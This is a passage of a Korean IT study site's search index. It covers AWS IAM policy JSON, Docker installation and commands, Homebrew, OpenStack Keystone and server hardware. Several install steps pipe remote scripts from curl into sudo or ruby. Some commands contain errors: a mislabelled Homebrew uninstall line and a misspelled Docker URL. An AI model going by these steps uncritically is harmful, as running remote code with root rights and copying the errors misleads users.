\u0026#34;ec2:GetHostReservationPurchasePreview\u0026#34;, \u0026#34;ec2:DescribeFastSnapshotRestores\u0026#34;, \u0026#34;ec2:GetConsoleScreenshot\u0026#34;, \u0026#34;ec2:GetReservedInstancesExchangeQuote\u0026#34;, \u0026#34;ec2:GetConsoleOutput\u0026#34;, \u0026#34;ec2:GetPasswordData\u0026#34;, \u0026#34;ec2:GetLaunchTemplateData\u0026#34;, \u0026#34;ec2:DescribeScheduledInstances\u0026#34;, \u0026#34;ec2:DescribeScheduledInstanceAvailability\u0026#34;, \u0026#34;ec2:GetEbsDefaultKmsKeyId\u0026#34;, \u0026#34;ec2:DescribeElasticGpus\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, } ] }  예제 2에서 생성한 정책에 진입하여, 정책 편집을 클릭 후, 권한 추가   편집기 사용시   서비스 : RDS\n작업 : 모든 RDS에 대한 작업\n리소스 : 모든 리소스 요청조건 : 없음\n   Json 사용시  { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;RDS:*\u0026#34;, \u0026#34;ec2:GetDefaultCreditSpecification\u0026#34;, \u0026#34;ec2:DescribeTags\u0026#34;, \u0026#34;ec2:GetCoipPoolUsage\u0026#34;, \u0026#34;ec2:DescribeVpnConnections\u0026#34;, \u0026#34;ec2:GetEbsEncryptionByDefault\u0026#34;, \u0026#34;ec2:GetCapacityReservationUsage\u0026#34;, \u0026#34;ec2:DescribeVolumesModifications\u0026#34;, \u0026#34;ec2:GetHostReservationPurchasePreview\u0026#34;, \u0026#34;ec2:DescribeFastSnapshotRestores\u0026#34;, \u0026#34;ec2:GetConsoleScreenshot\u0026#34;, \u0026#34;ec2:GetReservedInstancesExchangeQuote\u0026#34;, \u0026#34;ec2:GetConsoleOutput\u0026#34;, \u0026#34;ec2:GetPasswordData\u0026#34;, \u0026#34;ec2:GetLaunchTemplateData\u0026#34;, \u0026#34;ec2:DescribeScheduledInstances\u0026#34;, \u0026#34;ec2:DescribeScheduledInstanceAvailability\u0026#34;, \u0026#34;ec2:GetEbsDefaultKmsKeyId\u0026#34;, \u0026#34;ec2:DescribeElasticGpus\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34;, } ] } \r\r\r\r "}),a.add({id:53,href:'/docs/docker/docker/dockertraining/infradocker-02/',title:"Docker 설치",content:"Docker Install   Docker Insatll ( Ubuntu )   $ sudo apt-get update $ sudo apt-get updgrade # apt 업데이트 $ sudo apt-get install -y \\ apt-transport-https \\ ca-certificates \\ curl \\ software-properties-common # 패키지 설치 $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - # Docker의 공식 GPG 키를 추가 $ sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017-02-22 [SCEA] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown] Docker Release (CE deb) \u0026lt;docker@docker.com\u0026gt; sub rsa4096 2017-02-22 [S] #GPG Key 확인 $ sudo add-apt-repository \\ \u0026#34;deb [arch=amd64] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) \\ stable\u0026#34; # 레포지터리 등록 $ sudo apt-get install -y docker-ce # docker 설치  Cloud 혹은 다른 환경에서의 설치 : https://docs.doocker.com/installation/#installation     Docker 기본 명령어   \u0026lt;Docker container run\u0026gt; \u0026lt;Docker Imagename\u0026gt; \u0026lt;명령어\u0026gt;  \u0026lt;Docker container run : 컨테이너 작성 및 실핼 \u0026lt;Docker Imagename : 바탕이 되는 Docker 이미지 \u0026lt;명령어\u0026gt; : 컨테이너 안에서 실행할 명령어     $ docker version # docker 버전확인 $ docker system info # docker 실행환경확인 $ docekr system df # docekr 디스크 사용량 확인 $ docker ps # 서버의 상태 확인 $ docker pull \u0026lt;name\u0026gt; $ name Image 다운로드 $ docker images # 이미지 확인 $ docker container run --name \u0026lt;name\u0026gt; -d -p \u0026lt;host port num\u0026gt;:\u0026lt;container port num\u0026gt; nginx # 서버 기동 $ docker stats \u0026lt;name\u0026gt; # name의 정보를 출력 $ docker stop \u0026lt;name\u0026gt; # name의 컨테이너를 정지 $ docker kill \u0026lt;name\u0026gt; # name 컨테이너를 강제정지 $ docker unpause \u0026lt;name\u0026gt; # 정지된 name 컨테이너를 재개 $ docker start \u0026lt;name\u0026gt; # name의 컨테이너를 시작 $ docker container rm \u0026lt;옵션\u0026gt; \u0026lt;컨테이너 식별자\u0026gt; # -f : 실행 중인 컨테이너 강제 삭제 / -v : 할당한 볼륨을 삭제 # 해당 옵션으로 식별자의 컨테이너를 삭제한다 $ docker image inspect \u0026lt;name\u0026gt; # name의 이미지의 상세정보 출력 ( CPU, OS etc...) $ docker image tag \u0026lt;name\u0026gt; \u0026lt;new name:new version\u0026gt; # name의 이미지의 이미지 및 태그로 수정 $ docker image rm \u0026lt;옵션\u0026gt; \u0026lt;이미지명:태그\u0026gt; # 이미지명:태그의 이미지 삭제 # -f : 강제삭제 / --no-prune : 중간이미지를 삭제하지 않음 $ docker image prune \u0026lt;옵션\u0026gt; # 사용하지 않는 이미지 삭제 # -all, -a : 사용하지 않는 이미지를 모두 삭제 / -f : 강제로 삭제 $ docker image push \u0026lt;이미지명:태그명\u0026gt; # 이미지 upload $ docker logs -t \u0026lt;name\u0026gt; # name 이름의 컨테이너 로그를 출력 $ docker network ls \u0026lt;옵션\u0026gt; # -f : 필터 / --no-trunc : 상세정보 출력 / -q : network ID만 표시 # network 종류 출력 $ docker network create -d \u0026lt;network type\u0026gt; \u0026lt;name\u0026gt; # network type의 name network 생성 $ docker docker container stats \u0026lt;컨테이너 식별자\u0026gt; # 해당 컨테이너의 상태를 출력    Docker Images    Docker 이미지 형식\n 이미지명 : 태그명      Docker Store : https://store.docker.com $  $ docker image pull \u0026lt;옵션\u0026gt; \u0026lt;이미지명:태그명\u0026gt; # 선택한 옵션 값으리 특정 이미지의명의 태그 이미지를 다운로드 # -a 옵션은 모든 태그의 취득이 가능 ( 태그지정은 불가 )    이미지 출력  $ docker image ls \u0026lt;옵션\u0026gt; \u0026lt;리포지토리명\u0026gt;   옵션\n  -all, -a : 모든 이미지 표시\n  \u0026ndash;digests : 다이제스트 표시 유무\n  \u0026ndash;no\u0026ndash;trunc : 결과를 모두 표시\n  \u0026ndash;quiet, -q : Docker 이미지 ID만 표시\n        이미지 검색  $ docker search \u0026lt;옵션\u0026gt; \u0026lt;검색 키워드\u0026gt; # 옵션의 값으로 검색 키워드를 서치   옵션\n  \u0026ndash;no-trunc : 결과를 모두 표시\n  \u0026ndash;limit : n건의 검색 결과를 표시\n  \u0026ndash;filter=stars=n : 즐겨찾기의 수(n 이상)을 지정\n        이미지 위장, 변조 제거   $ export DOCKER_CONTENT_TRUST=1 # 상단의 명령어 입력시 이미지 검증작업을 수행 ( 0은 무효화 )    컨테이너 생성 및 시작   Docker Container run  $ docker container run \u0026lt;옵션\u0026gt; \u0026lt;이미지명:태그명\u0026gt; \u0026lt;인수\u0026gt;   옵션\n  \u0026ndash;attach, -a : 표준 입력, 출력, 오류 출력을 어태치\n  \u0026ndash;cidfile 컨테이너 ID 파일오 출력\n  \u0026ndash;detach -d : 컨테이너를 생성하고 백그라운드에서 실행\n  \u0026ndash;interctive, -l : 컨테이너의 표준 입력을 연다\n  \u0026ndash;tty, -t : 단말기 디바이스를 사용\n  \u0026ndash;user, -u : 사용자명 지정\n  -restart=num : 명령의 실행 결과에 따라 재시작을 진행\n  \u0026ndash;rm : 명령 실행 완료 후 자동으로 삭제\n           자원을 지정하여 컨테이너 생성 및 실행 ( docker container run )  $ docker container run \u0026lt;자원 옵션\u0026gt; \u0026lt;이미지명:태그명\u0026gt; \u0026lt;인수\u0026gt;   옵션\n  \u0026ndash;cpu-shares, -c : CPU의 사용비율\n  \u0026ndash;memory, -m : Memory 사용비율 ( 단위 b, k, m, g )\n  \u0026ndash;volume=[호스트의 디렉토리:[컨테이너의 디렉토리]], -v : 호스트와 컨테이너의 디렉토리 공유\n        Docker Container 환경변수  $ docker container run \u0026lt;환경설정 옵션\u0026gt; \u0026lt;이미지명:태그명\u0026gt; \u0026lt;인수\u0026gt;   옵션\n  \u0026ndash;env=\u0026lt;환경변수\u0026gt;, -e : 환경변수를 설정\n  \u0026ndash;env-file=\u0026lt;파일명\u0026gt; : 환경변수를 파일로부터 설정\n  \u0026ndash;read-only=\u0026lt;true | false\u0026gt; : 컨테이너의 파일 시스템을 읽기전용으로 설정\n  \u0026ndash;workdir=, -w : 컨테이너의 작업 디렉토리를 지정\n  \u0026ndash;user=\u0026lt;사용자명\u0026gt;, -u : 사용자명 또는 UID를 지정\n         Docker container network run\n  \u0026ndash;add-host=: 컨테이너의 /etc/hosts에 호스트명과 IP주소를 정의\n  \u0026ndash;dns=: 컨테이너용 DNS 서버의 IP 주소 지정\n  \u0026ndash;expose : 지정한 범위의 포트 번호를 할당\n  \u0026ndash;mac-address=: 컨테이너의 MAC 주소를 지정\n  \u0026ndash;net=[bridge | none | container:\u0026lt;name | id\u0026gt; | host | NETWORK] : 컨테이너의 네트워크를 지정\n  \u0026ndash;hostname, -h : hostname 지정\n  \u0026ndash;publish, -p : 호스트와 컨테이너 포트 매핑\n  \u0026ndash;publish-all, -P : 호스트의 임의의 포트를 컨테이너에 할당\n          Docker Hub  $ docker login \u0026lt;옵션\u0026gt; \u0026lt;서버\u0026gt; # 해당 서버에 특정 옵션으로 login # -p : pw / -u : 사용자명     Docker 출력 형식 지정  $ docker container ls -a \u0026#34;{{.Names}}: {{.Status}}\u0026#34;...   옵션\n  .ID : 컨테이너 ID\n  .Image : 이미지 ID\n  .Command : 실행명령\n  .CreatedAt : 컨테이너가 작성된 시간\n  .RunningFor : 컨테이너 가동시간\n  .Ports : 공개포트\n  .Status : 컨테이너 상태\n  .Size : 컨테이너 디스크 크기\n  .Names : 컨테이너명\n  .Mounts : 불륨 마운트\n  .Networks : 네트워크명\n      "}),a.add({id:54,href:'/docs/docker/docker/docker/docker-2/',title:"Docker 환경구축",content:"Docker 환경구축    이번 장에서는 로컬환경에서 Docker를 구축하는 방법에 대해 알아보겠습니다. 설치에 대한 자세한 설명은 Docker docs를 참고해주세요.    Docker 설치    Docker는 기본적으로 Linux 플랫폼, MacOS, Window 10을 지원하고 있습니다. Docker 지원 DESKTOP     Docker 지원 SERVER      Debian 설치   Debian 환경   Debian계열 Linux에 Docker Engine을 설치 하기 위해서는 하단의 요구조건을 충족해야 합니다.  Debian Buster 10 or Debian Stretch 9/ Raspbian Streetch x86_64 or amd 64, armhf, arm64       Debian 구 버전 Docker 삭제 $ sudo apt-get remove docker docker-engine docker.io containerd runc # 기존 Docker 패키지를 삭제합니다. # /var/lib/docker/의 존재하는 이미지, 컨테이너, 볼륨 및 네트워크를 포함한 컨텐츠들은 보존됩니다.    Debian Docker 실치   Docker는 하단과 같이 다양한 방법으로 Docker Engine의 설치가 가능합니다.  Docker 레포지터리를 등록 후 설치 DEB 패키지를 다운로드 후, 수동으로 설치 및 관리 테스트 및 개발 환경에서의 편의 스크립트를 이용한 설치     저장소를 이용한 설치  $ sudo apt update -y $ sudo apt-get -y install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg-agent \\ software-properties-common # 의존성 패키지를 설치 합니다. $ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - # Docker의 공식 GPG 키를 추가합니다. $ sudo apt-key fingerprint 0EBFCD88 pub rsa4096 2017-02-22 [SCEA] 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 uid [ unknown] Docker Release (CE deb) \u0026lt;docker@docker.com\u0026gt; sub rsa4096 2017-02-22 [S] # 9DC8 5822 9FC7 DD38 854A E2D8 8D81 803C 0EBF CD88 키가 정상적으로 등록 되었는 지 확인합니다. $ sudo add-apt-repository \\ \u0026#34;deb [arch=arm64] https://download.docker.com/linux/debian \\ $(lsb_release -cs) \\ stable\u0026#34; # docker stable 레포지터리를 등록합니다. $ sudo apt-get update $ sudo apt-get install docker-ce docker-ce-cli containerd.io # docker를 설치합니다. $ sudo apt update -y $ sudo apt install -y docker-ce # Docker 설치 $ docker version    CentOS 7   $ sudo yum update -y $ sudo yum install –y docker docker-registry epel-release jq # Docker 설치 및 Docker 레지스트리 설치 $ systemctl enable docker $ systemctl start docker $ systemctl status docker # Docker 자동시작 설정 및 확인 $ sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-engine # Docker 구버전 제거    "}),a.add({id:55,href:'/docs/system/macos/macos02/',title:"Homebrew",content:"MacOS 패키지 관리 애플리케이션 - Homebrew    Homebrew는 맥스 호웰이 만든 macOS용 패키지 관리 애플리케이션\n  Homebrew는 Ruby기반으로 개발되고 있으며, MacOS용 패키지 관리에 사실상 표준으로 사용되어 지고 있음\n  주로 커맨드라인 도구나 시스템 패키지를 설치하는데 사용하지만, Cask 확장을 통해 GUI 애플리케이션 설치에도 사용이 가능\n  기본적으로 MacOS용 패키지 관리자이지만 리눅스나 윈도우용 WSL도 지원\n  단, 편리하게 사용할 수 있는 장점이 있지만, 커뮤니티 기반으로 운영되기에 패키지의 안정성이 보장되지 않는 다는 단점이 존재\n  Homebrew docs\n     Bhomebrew Install**   Homebrew을 설치하기 위해서는 xCode 커맨드라인 툴, 사전 설치가 필요   $ sudo $ /usr/bin/ruby -e \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\u0026#34; # 해당 홈페이지에서 최신 스크립트를 다운받아 설치 $ brew --version # 설치가 완료되면 버전이 출력 $ brew help # 관련 명령어를 출력 $ sudo /usr/bin/ruby -e \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\u0026#34; # Homebrew uninstall     GUI 애플리케이션을 설치 cask   Homebrew에는 GUI 애플리케이션을 설치할 수 있는 캐스크 확장이 존재, 캐스크 패키지는 별도로 관리되며, 이 패키지를 설치하려면 brew 뒤에 cask를 붙임  ex)brew cask install vlc       cask Install  $ brew install cask # cask 패키지 설치    Homebrew Fomulae   Homebrew 패키지 명세를 의미하는 포뮬라는 루비 코드로 작성  class Wget \u0026lt; Formula # wget 패키지 포뮬라를 정의 homepage \u0026#34;https://www.gnu.org/software/wget/\u0026#34; # 패키지 홈페이지 지정 url \u0026#34;https://ftp.gnu.org/gnu/wget/wget-1.15.tar.gz\u0026#34; # 패키지 다운로드 경로 지정 sha256 \u0026#34;52126be8cf1bddd7536886e74c053ad7d0ed2aa89b4b630f76785bac21695fcd\u0026#34; # 다운로드 받을 파일의 sha256 해시 값을 지정 def install # Install 메서드 system \u0026#34;./configure\u0026#34;, \u0026#34;--prefix=#{prefix}\u0026#34; system \u0026#34;make\u0026#34;, \u0026#34;install\u0026#34; end end $ brew update-reset # 패키지 포뮬라 복구   "}),a.add({id:56,href:'/docs/openstack/openstack/keystone/',title:"Keystone",content:"인증을 관리하는 서비스 : Keyston   인증을 관리하는 서비스 : Keystone   Keystone은 인증 토큰을 비롯해 테넌트 및 사용자 관리, 서비스의 엔드포인트 URL 등을 관리하는 서비스 Keystone은 openstack의 백엔드에서 RBAD ( Role Based Access Control )을 통해 사용자의 접근을 제어하는 등의 인증 ( Identify ) 서비스로 사용되며 다음과 같은 기능으로 이루어져 있음     Keystone의 구성요소      구성요소 역할     user 사람 또는 오픈 스택 서비스를 이용하는 서비스 ( nova, neutron, cinder 등 )을 의미     User은 특정 프로젝트에 할당할 수 있으며, 증복을 허용하지 않음         Authentication 사용자의 신분을 확인하는 절차로, 특정 값을 통해 Keystone이 이를 검증     보통 인증을 위한 자료로는 ID, PW가 사용되며 Keystone은 인증확인 시 인증토큰을 방행         Token RBAD의 신분을 증명하기 위해 사용되는 텍스트 데이터   Token type fernet, uuid, pki, pkiz     어떤 자원에 접근이 가능한지 범위가 지정되어 있음 ( 시간 제한 있음 )         Project Keystone V2까지 Tenant라는 이름으로 사용 ( V3 이후 Project )     어떤 자원이나 어플리케이션에 대한 권리를 가진 보안그룹     프로젝트는 특정 도메인에 의해 소유         Endpoint 사용자가 서비스를 이용하기 위해 연결정보를 제공하는 접근 가능한 네트워크 주소 ( URL )   EndPoint type admin, internal, public         Role 사용자가 어떤 동작을 수행하도록 허용하는 규칙     사용자가 가지는 역할은 사용자에게 발행된 토큰을 통해 확인     사용자가 서비스를 호출하면, 서비스는 토큰에 저장된 사용자의 역할을 해석하여 허용유무 결정         Domain 구성요소를 효과적으로 관리하기 위한 사용자, 그룹, 프로젝트의 집합     사용자들은 한 도메인의 관리자의 권한 등을 부여받는 방식으로 역할을 부여가능     Domain, Project, Group, User, Rule 개념과 관계  Keystone은 위에도 언급하였 듯이 사용자 인증 부분과 서비스 인증 부분을 관리 사용자일 때는 사용자 ID와 패스워드, 사용자 권한의 롤( Roll )을 등록 서비스일 때는 서비스를 등록하고 해당 서비스의 엔드포인트 URL을 등록  도메인(Domain)은 서로 분리되어 있음 각 도메인에는 프로젝트와 사용자가 있음 프로젝트는 사용자를 가질 수 있음 사용자에게는 롤이 있으며, 여러 프로젝트의 구성원이 될 수 있음 관리자 롤(Admin Role)을 가진 사용자끼리, 일반 사용자롤(Member Role)을 가진 사용자간의 그룹핑(Grouping)을 할 수 있음       Keystone의 논리 아키텍처   Keystone의 논리 아키텍처는 토큰(Token), 카탈로그(Catalog), 정책(Poliy), 인증(Identity) 으로 구성      구성요소 역할     Token Backend 사용자별 토큰을 관리   Catalog Backend 오픈스택에서 모든 서비스의 엔드포인트 URL을 관리   Policy Backend 테넌트, 사용자 계정, 롤 등을 관리   Identity Backend 사용자 인증을 관리       Openstack에서 Keystone 위치    Openstack Keystone은 모든 서비스를 관장하는 위치 모든 User, Service는 Keystone의 인증을 통해서만 요청, 응답이 가능 Keystone은 타인이나 해커에게서 시스템을 안전하게 보호하고 사용자 등록, 삭제, 권한 관리, 사용자가 접근할 수 있는 서비스 포인트 관리와 다른 API들의 인증 등의 전체적인 인증 프로세스를 관리하는 역할을 수행    "}),a.add({id:57,href:'/docs/system/linux/',title:"Linux",content:"Linux   Linux docs   Linux란?\n  Linux System Management\n  Linux Filesystem\n  Linux 압축\n  Linux 문자열 처리\n  Linux 날짜\n  Linux 파일처리\n  Linux Network\n  Linux 형식파일\n        Linux Training   Mount\n  \n       Linux master   Linux master 개요    Linux master 1급 1차  리눅스 실무의 이해 리눅스 시스템 관리 네트워크 및 서비스의 활용      Linux master 1급 2차  리눅스시스템 관리 네트워크 및 서비스의 활용      Linux master 2급  Linux 일반 Linux 운용 및 관리 Linux 활용    "}),a.add({id:58,href:'/docs/azure/',title:"Microsoft Azure",content:""}),a.add({id:59,href:'/docs/ncp/ncptraining/',title:"NCP Training",content:"NCP Training      현재 정리중입니다!  "}),a.add({id:60,href:'/docs/network/nm/nm02/',title:"Network Master 2급 실기정리",content:"Network Master 2급   Network Master 실기정리   정리중입니다!  "}),a.add({id:61,href:'/docs/project/study/',title:"Network, System",content:""}),a.add({id:62,href:'/docs/infra/infra/infra02/',title:"Server",content:"Server    Server Type   설치 장소나 용도가 다양하여 서버는 여러 모델이 존재합니다.    랙 마운트형 서버    랙 마운트형 서버는 데이터 센터나 서버 룸에 설치된 랙 안에 들어가는 서버로 19인치 랙에 수용하는 것을 전제로 하며, 기기는 1U, 2U처럼 유닛 단위로 사이즈가 정해져 있으며, 1U 높이가 1.75인치로 확장성을 위해 2U 사이즈 이상인 서버가 많습니다.     타워형 서버\n 타워형 서버는 기본적으로 우리가 사용하고 있는 Desktop PC입니다.    서버는 냉방과 소음을 고려해서 설치 장소를 골라야 합니다. 데이터 센터나 서버 룸처럼 냉방 장치가 설치된 밀폐된 전용 공간에 서버를 설치합니다면 특별한 문제가 없으며, 만약 타워형 서버를 일반적인 사무실에 설치합니다면 저소음 서버를 준비시킬수도 있습니다.\n  또한 하나의 서버는 작지만, 여러 서버가 모여 고밀도를 이루는 경우 바닥의 하중을 반드시 주의하여야 합니다.\n     용도에 다른 구분   일반적으로 서버는 사용하는 용도에 따라 엔트리, 미들레인지, 하이엔드 서버를 구분해서 사용합니다.     엔트리 서버\n 수백만원의 가격으로 주로 웹 서버나 애플리케이션 서버에 이용되며, 보통 소켓 단위로 1~ 2개의 CPU를 탑재할 수 있는 서버를 칭합니다.       미들레인지 서버\n 수천만원의 가격으로 주로 데이터베이스 서버나 기간계 서버에서 이용되며, 대체로 소켓 단위로 4개 이상의 CPU를 탑재할 수 있으며, 하이엔드 서버에 속하지 않는 서버를 가르키며, 기간 업무 시스템이라고도 불리며 기업 경영을 지속하는 데 핵심이 되는 재무괸리, 업무관리, 생산관리 등을 담당하는 시스템입니다.       하이엔드 서버\n 수억원의 가격으로 주로 데이터베이스나 서버나 기간계 서버에서 이용되며, 대체로 소켓 단위로 수십 개 이상의 CPU를 탑재할 수 있는 서버를 칭합니다.       IA 서버\n IA 서버란 인텔이나 AMD 등 인텔 호환 CPU를 탑재하고 일반 컴퓨터와 같은 아키텍처를 기반으로 만들어진 서버를 뜻합니다.       엔터프라이즈 서버\n  시스템의 핵심인 기간계에 사용되는 기기는 기본적으로 높은 가격을 형성하고 있으며, 이는 엑세스가 대량으로 발생해도 견딜 수 있는 수용량과 내구성을 가지고 있기 때문입니다. 이러한 서버들은 엔터프라이즈 서버라 합니다.\n  중요도가 높은 엔터프라이즈 서버는 만약 하드웨어의 이상 경고가 발생사 자동으로 업체에 통보되도록 되어 있어 문제가 발생시 자동으로 수리하러 오게 할 수도 있습니다.\n       서버 선정의 조건    IT 서비스의 인프라를 구축할 때 무수히 많은 선택지 중에서 적절한 서버를 선택하는 것은 어려운 작업으로, 서버의 선정 요령은 가능한 선택지를 줄인 다음 핵심만을 추려합니다.\n  서버의 사양을 결정할 때 필요한 하드웨어 자원의 사용량을 정하고 나서 CPU, 메모리, 디스크 NIC 포트 수 등을 결정합니다. 또한 부가적인 요소로 RAID 유무, PSU 이중화, 보수 연수, 보수 수준, 확정성, 물리 사이즈와 중량 등도 함께 결정하게 됩니다.\n     항목 선택지     CPU 주파수, 소켓 수, 코어 수, 캐시 용량, 가상화 지원 등   메모리 용량, 전송 속도, 매수 등   디스크 용량, 회전 수, 하드디스크 또는 SSID 등   RAID RAID 1/5/6/10/50/60 등   NIC 2포트, 4포트, 8포트 등   PSU 총 와트 수, 비이중화, 이중화   보증기간 1년, 3년, 5년 등   지원 수준 4시간 온사이트, 영업시간, 날짜 등   확정성 메모리 소켓 수, PCI 슬로 쑤, 디스크 탑재 수 등   물리적인 사이즈 1U, 2U, 4U 등   무게 경량, 초중량 등      서버 사양을 결정하려면 선택할 것이 너무 많아지므로, 어떻게 선택지를 좁혀갈 수 있는 지가 중요합니다.\n  다음은 기본적으로 결정하는 3가지 사고 방식입니다.\n  실제 환경을 시험적으로 구축해 측정 결과를 보고 판단합니다.\n  임시로 결정한 서버 사양의 기기를 현장에 투입해 실제 하드웨어 자원의 이용 상황을 측정한 다음 서버와 서버의 부품을 늘리거나 줄입니다.\n  소거법으로 사양을 좁혀갑니다.\n       Scale UP과 Scale OUT    서버의 수용량을 늘리는 접근 방식에는 Scale UP과 Scale OUT이 있습니다.\n  Scale UP은 서버의 리소스를 증가시켜 수용량을 증가시키는 방법이며, Sacle OUT은 서버 자체를 증가시키는 방법입니다.\n     CPU    CPU는 연산을 대량으로 빠르게 처리하는 장치입니다.\n  CPU는 연산능력이 높으면 높을수록 고성능 CPU로 분류되며, 이전에는 동작 주파수를 올려서 연산 능력을 높였지만, 일반적으로 CPU의 연산 능력이 높아질수록 발열과 소비 전력도 커지므로 CPU도 성능을 높이면서도 발열과 소비 전력은 억제하는 방향으로 진화해왔습니다.\n  이에따라 최근에는 동작 주파수를 어느 정도 수준으로 억제하는 대신, 멀티코어나 멀티스레드와 같은 방식을 이용해서 하나의 CPU로 동시에 처리할 수 있는 연산 개수를 늘려 연산 능력을 향싱시키고 있습니다.\n    CPU 관련 용어     용어 설명     소켓 수 CPU의 개수   코어 수 CPU의 주요 계산 부분, 복수의 코어가 있는 것을 \u0026lsquo;멀티코어\u0026rsquo;라고 함   스레드 수 하나의 코어에서 처리할 수 있는 수 (하이퍼스레딩 기능이 있으면 코어 수가 배)   동작 주파수 1초당 클럭 수   캐시 CPU와 메인 메모리 사이에 캐시 메로리라는 빠른 속도의 메모리를 통해 자주 엑세스하는 데이터를 저장   하이퍼스레딩 하나의 코어로 두 개의 처리를 실행할 수 있는 기술   터보부스트 CPU 속도를 자동으로 기준 쿨럭보다 빠르게 동작시키는 기능       CPU 선정의 기준    성능\n 요구하는 연산 능력을 만족하는가?       가격\n  가격이 타당한가?\n  사용할 소프트웨어의 라이선스의 체게의 따라 가격이 변동될 수 있습니다.\n       소비전력\n CPU는 비교적 전력을 많이 사용합니다. 그렇기에 전력 또한 비용에 비중을 차지고하고 있습니다.       메모리    메모리는 단기 기억 영역으로 불리며, 일시적으로 데이터를 기억할 수 있지만 전원이공급되지 않으면 데이터가 모두 지워집니다.\n  메모리에서 가장 중요한 요소는 메모리 용량의 크기지만, 서버용 메모리에서는 용량 이외에도 내장에성, 성능, 저잔력 등이 중시됩니다.\n  메모리의 속도는 메모리 자체의 속도와 CPU와 각종 버스 간의 데이터 전송폭을 모두 고려합니다. 보통은 DDRx 메모리는 DDRx-yyyy처럼 표기합니다. 이 중 yyyy는 데이터의 전송 속도를 나타냅니다.\n    메모리 용어     슬롯\n 메모리는 메인보드에 꽂으며, 슬롯은 메인보드에 있는 메모리 삽입구를 의미합니다.       ECC 메모리\n 메모리 고장으로 비트 반전 오류가 발생했을 때, 자동으로 보정, 감지할 수 있도록 ECC(Error Correction Code)라고 불리는 패리티 정보가 추가된 메모리를 의미합니다.       채널\n  위 그림과 같이 CPU와 메인보드의 칩셋이 복수의 채널을 지원하면, 채널별로 같은 종류의 메모리를 탑재해 데이터 폭을 넓히고 성능을 높일 수 있습니다.\n  하나의 메모리로는 64bit의 데이터 폭으로 전송되지만, 듀얼 채널 환경에서는 2개의 메모리를 동시에 액세스해서 128bit의 데이터 폭으로 전송할 수 있게 됩니다.\n  단, 다중 채널을 실현할 때는 각 프로세서의 메모리 구성은 동일해야 합니다는 규정이 있습니다.\n       랭크\n  메모리 컨트롤러가 메모리 DRAM에서 데이터를 입출력하는 단위를 가리켜 링크라고 부르며, 하나의 랭크는 64bit 단위로 입출력된다. 링크에는 싱슬 링크(1R), 듀얼 링크(2R), 쿼드 링크(4R)가 존재합니다.\n  메모리는 DRAM 칩의 조합으로 구성된다. 싱글 랭크 메모리에서는 하나의 메모리에 64bit의 DRAM이 탑재되어 있습니다.\n       UDIMM\n Unbufferd DIMM으로 불리는 버퍼 없는 DIMM(Dual In-line Memory Module)을 의미합니다.       RDIMM\n Registered DIMM으로고도 불리는 레지스터 DIMM으로 쿨럭과 주소 등의 제어신호를 버퍼 회로가 가져와며, 대용량 메모리나 안정적으로 운영이 필요한 서버용 메모리로 자주 사용합니다. 단, 중간에 버퍼 회로가 끼어들어 레이턴시가 증가하므로 UDIMM보다 엑세스 속도가 약간 떨어집니다.       LRDIMM\n  LRDMM(Load Reduced DIMM)은 RDIMM을 더욱 발전시킨 방식으로 메모리 컨트롤러와 메모리 칩 사이의 모든 통신이 버퍼 회로를 매개로 이루어지는 DIMM입니다.\n  메모리 버스 전체의 부하를 줄여서, 메인보드에 장착 가능한 모듈 수를 느리거나 모듈 하나당 메모리 칩 수를 늘릴 수 있습니다.\n       LV\n 저전압으로 일반 메모리보다 전압을 낮추어 저전력을 실현한 메모리입니다.       메모리 선정기준    용량\n 필요한 메모리 용량에 적합한 설치해야합니다.       성능\n  메모리에 빠르게 액세스하도록 하려면 고속인 메모리를 선택하고 듀얼 채널 이상일 때는 가장 좋은 성능을 낼 수 있는 방식으로 삽입합니다.\n  또한 메모리 컨트롤러가 다룰 수 있는 최대 랭크 수까지 다 사용할 수 있도록 하며, 다중 프로세서 환경에서 다중 채널을 구현하도록 합니다.\n       확장성\n 메모리 슬롯 수는 한정되어 있으므로, 앞으로 확장이 예상될 때는 비싸더라도 대용량 메모리를 선택하도록 합니다.       Disk   주로 일반적인 컴퓨터에서는 SATA 하드디스크와 SSD가 사용되며 업무용으로는 더 다양한 디스크가 사용됩니다.   Disk의 종류   SATA(Serial ATA) 하드 디스크\n 가격이 저렴하며, 하루 8시간 정도의 가동 용도로 사용합니다. SAS 하드디스크보다 가격이 저렴하지 않으므로 중요하지 않은 서버에서는 일부러 내장애성을 희생하고 SATA하드 디스크를 채용하기도 합니다.       SAS(Serial Attached SCSI) 하드디스크\n  고속으로 동자하고 신뢰성이 높다. 24시간, 365일 가동할 용도로 사용합니다.\n  3.5인치 및 2.5인치 하드디스크가 있다.\n       FC(Fibre Channel) 하드디스크는 초고속으로 동작하고 신뢰성이 높다. SAN 스토리지 등 엔터프라이즈 용도로 사용합니다.\n FC 하드디스크는 초고속으로 동작하고 신뢰성이 높다. SAN 스토리지 등 엔터프라이즈 용도로 사용합니다.       각 인터페이스의 전송속도 비교     인터페이스 SATA SAS FC     최대 전송 속도 6Gbit/s (SAS2.1) 6Gbit/s, (SAS3.0) 12Gbit/s 8Gbit/s   최대 케이블 길이 1m 8m 정도 30m   접속 토폴러지 호스트컨트롤러와 1:1 스타형(SAS Expander 이용시 증감가능) 루프형(FC-AL)/ 패브릭형(FC-SW)   접속 가능 수 1대 128대(SAS Expander 이용시 최대 16만 대) 126대 / 1678만대   다중 링크 미지원 지원 지원   커맨드 ATA SCSI SCSI        니어라인(near-online) 하드디스크\n 온라인과 오프라인 중간 상태인 니어 온라인으로 